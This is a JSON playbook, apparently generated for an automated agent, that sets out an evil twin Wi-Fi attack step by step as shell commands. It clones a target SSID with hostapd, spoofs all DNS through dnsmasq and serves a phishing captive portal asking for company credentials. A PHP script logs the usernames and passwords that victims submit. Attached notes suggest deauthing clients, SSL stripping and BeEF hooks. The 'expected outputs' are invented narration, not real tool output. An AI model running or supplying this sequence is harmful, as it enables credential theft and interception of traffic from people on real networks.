{
  "name": "evil_twin_rogue_ap",
  "description": "Evil twin and rogue access point attacks for credential harvesting and MITM",
  "pattern": "evil.*twin|rogue.*ap|fake.*ap|hostapd|captive.*portal",
  "parameters": [
    "interface",
    "ssid",
    "channel"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > hostapd.conf << 'EOF'\ninterface=wlan0\ndriver=nl80211\nssid=OfficeMain\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nignore_broadcast_ssid=0\nauth_algs=1\nwpa=2\nwpa_passphrase=TemporaryPassword123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\nEOF\ncat hostapd.conf"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "interface=wlan0\ndriver=nl80211\nssid=OfficeMain\nhw_mode=g\nchannel=6\nmacaddr_acl=0\nignore_broadcast_ssid=0\nauth_algs=1\nwpa=2\nwpa_passphrase=TemporaryPassword123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\n\nhostapd configuration created:\n  Interface: wlan0\n  SSID: OfficeMain (same as legitimate network)\n  Channel: 6 (same as target)\n  Security: WPA2-PSK\n  Password: TemporaryPassword123 (temporary for evil twin)\n  \nEvil Twin strategy:\n  1. Clone target SSID and settings\n  2. Use same channel as legitimate AP\n  3. Boost signal power to be stronger\n  4. Deauth clients from real AP\n  5. Clients auto-connect to evil twin\n  6. Capture credentials or perform MITM\n  \nOptional enhancements:\n  - MAC address cloning (match real AP BSSID)\n  - Captive portal for credential phishing\n  - SSL stripping for HTTPS downgrade"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > dnsmasq.conf << 'EOF'\ninterface=wlan0\ndhcp-range=192.168.10.10,192.168.10.100,12h\ndhcp-option=3,192.168.10.1\ndhcp-option=6,192.168.10.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\naddress=/#/192.168.10.1\nEOF\ncat dnsmasq.conf"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "interface=wlan0\ndhcp-range=192.168.10.10,192.168.10.100,12h\ndhcp-option=3,192.168.10.1\ndhcp-option=6,192.168.10.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\naddress=/#/192.168.10.1\n\ndnsmasq configuration:\n  Interface: wlan0 (evil twin AP)\n  DHCP range: 192.168.10.10 - 192.168.10.100\n  Gateway: 192.168.10.1 (our machine)\n  DNS: 192.168.10.1 (our machine for DNS spoofing)\n  Lease time: 12 hours\n  \nDNS spoofing enabled:\n  address=/#/192.168.10.1\n    All DNS queries redirected to 192.168.10.1\n    Clients trying to visit any site → our server\n    Perfect for captive portal\n  \nDHCP provides:\n  - IP address to connecting clients\n  - Gateway (us) for internet routing\n  - DNS server (us) for domain resolution\n  - Full control over client traffic"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "ifconfig wlan0 192.168.10.1 netmask 255.255.255.0 && ifconfig wlan0"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 192.168.10.1  netmask 255.255.255.0  broadcast 192.168.10.255\n        inet6 fe80::a00:27ff:fe8d:c04d  prefixlen 64  scopeid 0x20<link>\n        ether 08:00:27:8d:c0:4d  txqueuelen 1000  (Ethernet)\n        RX packets 0  bytes 0 (0.0 B)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 0  bytes 0 (0.0 B)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nInterface configured:\n  wlan0: 192.168.10.1/24\n  Gateway IP for evil twin network\n  \nNetwork setup:\n  - AP (wlan0): 192.168.10.1\n  - DHCP range: 192.168.10.10-100\n  - Clients get IPs in this range\n  - All traffic routes through 192.168.10.1 (us)\n  \nNext steps:\n  1. Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward\n  2. Setup NAT: iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\n  3. Start hostapd\n  4. Start dnsmasq\n  5. Launch deauth attack against real AP"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "hostapd",
        "args": [
          "hostapd.conf"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Configuration file: hostapd.conf\nUsing interface wlan0 with hwaddr 08:00:27:8d:c0:4d and ssid \"OfficeMain\"\nwlan0: interface state UNINITIALIZED->ENABLED\nwlan0: AP-ENABLED\n\nEvil twin AP started!\n  SSID: OfficeMain\n  BSSID: 08:00:27:8d:c0:4d\n  Channel: 6\n  Security: WPA2-PSK\n  Password: TemporaryPassword123\n  \nAP is broadcasting and ready to accept connections\n  \nClients will see:\n  - SSID: OfficeMain (identical to real network)\n  - Signal strength: May be stronger if closer\n  - Security: WPA2 (same as real)\n  \nTo force connections:\n  Use aireplay-ng deauth on real AP\n  Clients disconnect and automatically reconnect\n  May choose our stronger/closer signal\n  \nMonitor connections:\n  tail -f /var/log/syslog | grep hostapd"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "dnsmasq",
        "args": [
          "-C",
          "dnsmasq.conf",
          "-d"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "dnsmasq: started, version 2.86 cachesize 150\ndnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset auth cryptohash DNSSEC loop-detect inotify dumpfile\ndnsmasq-dhcp: DHCP, IP range 192.168.10.10 -- 192.168.10.100, lease time 12h\ndnsmasq-dhcp: DHCP, sockets bound exclusively to interface wlan0\ndnsmasq: reading /etc/resolv.conf\ndnsmasq: using nameserver 8.8.8.8#53\ndnsmasq: cleared cache\n\n[When client connects:]\ndnsmasq-dhcp: DHCPDISCOVER(wlan0) AB:CD:EF:12:34:56\ndnsmasq-dhcp: DHCPOFFER(wlan0) 192.168.10.15 AB:CD:EF:12:34:56\ndnsmasq-dhcp: DHCPREQUEST(wlan0) 192.168.10.15 AB:CD:EF:12:34:56\ndnsmasq-dhcp: DHCPACK(wlan0) 192.168.10.15 AB:CD:EF:12:34:56 DESKTOP-ABC123\n\n[When client makes DNS query:]\ndnsmasq: query[A] google.com from 192.168.10.15\ndnsmasq: forwarded google.com to 192.168.10.1 (configured to return 192.168.10.1)\n\ndnsmasq started:\n  DHCP server active on wlan0\n  DNS server active (spoofing enabled)\n  \nClient connected:\n  MAC: AB:CD:EF:12:34:56\n  IP: 192.168.10.15 (assigned by our DHCP)\n  Hostname: DESKTOP-ABC123\n  \nDNS spoofing active:\n  All domains → 192.168.10.1\n  Perfect for captive portal\n  Redirect all HTTP to credential phishing page\n  \nTraffic flow:\n  Client → DNS query → Our dnsmasq → Returns 192.168.10.1\n  Client → HTTP request → Our web server → Phishing page"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "mkdir -p /var/www/html/portal && cat > /var/www/html/portal/index.html << 'EOF'\n<!DOCTYPE html>\n<html>\n<head>\n<title>WiFi Login Required</title>\n<style>\nbody { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }\n.login-box { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\ninput { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }\nbutton { width: 95%; padding: 12px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }\n</style>\n</head>\n<body>\n<div class=\"login-box\">\n<h2>OfficeMain WiFi</h2>\n<p>Please enter your company credentials to access the internet</p>\n<form action=\"/capture.php\" method=\"POST\">\n<input type=\"text\" name=\"username\" placeholder=\"Username\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Connect to WiFi</button>\n</form>\n</div>\n</body>\n</html>\nEOF\ncat /var/www/html/portal/index.html"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "<!DOCTYPE html>\n<html>\n<head>\n<title>WiFi Login Required</title>\n[... HTML content ...]\n<form action=\"/capture.php\" method=\"POST\">\n<input type=\"text\" name=\"username\" placeholder=\"Username\" required>\n<input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n<button type=\"submit\">Connect to WiFi</button>\n</form>\n[... rest of HTML ...]\n\nCaptive portal page created:\n  Location: /var/www/html/portal/index.html\n  Title: OfficeMain WiFi (matches target SSID)\n  Form: Username + Password\n  Submit: POST to /capture.php\n  \nSocial engineering:\n  - Looks like legitimate WiFi login\n  - Requests \"company credentials\"\n  - Professional appearance\n  - Urgent need (\"to access internet\")\n  \nWhen victim connects to evil twin:\n  1. Gets DHCP IP from dnsmasq\n  2. Opens browser → any URL\n  3. DNS redirects to 192.168.10.1\n  4. Sees this login page\n  5. Enters credentials\n  6. Credentials captured by /capture.php\n  7. Redirect to real internet (optional)\n  \nCapture script needed:\n  - PHP/Python to receive POST data\n  - Log username + password\n  - Optionally redirect to internet"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > /var/www/html/portal/capture.php << 'EOF'\n<?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$timestamp = date('Y-m-d H:i:s');\n\n$log = \"[$timestamp] IP: $ip | Username: $username | Password: $password\\n\";\nfile_put_contents('/var/log/evil_twin_creds.log', $log, FILE_APPEND);\n\nheader('Location: http://google.com');\nexit();\n?>\nEOF\ncat /var/www/html/portal/capture.php"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "<?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$timestamp = date('Y-m-d H:i:s');\n\n$log = \"[$timestamp] IP: $ip | Username: $username | Password: $password\\n\";\nfile_put_contents('/var/log/evil_twin_creds.log', $log, FILE_APPEND);\n\nheader('Location: http://google.com');\nexit();\n?>\n\nCredential capture script:\n  Captures: Username, password, IP, timestamp\n  Logs to: /var/log/evil_twin_creds.log\n  Redirects to: google.com (appears like normal WiFi)\n  \nAttack flow:\n  1. Victim enters credentials\n  2. POST to capture.php\n  3. Credentials saved to log file\n  4. Redirect to Google (victim thinks WiFi is working)\n  5. Victim browses normally\n  6. Attacker has credentials\n  \nMonitor captured credentials:\n  tail -f /var/log/evil_twin_creds.log\n  \nExample log entry:\n  [2024-01-15 15:30:45] IP: 192.168.10.15 | Username: john.doe | Password: JohnPassword2024!\n  \nOptional enhancements:\n  - SSL strip (downgrade HTTPS)\n  - Inject BeEF hook\n  - MITM all traffic\n  - Proxy to real network (full MITM)"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
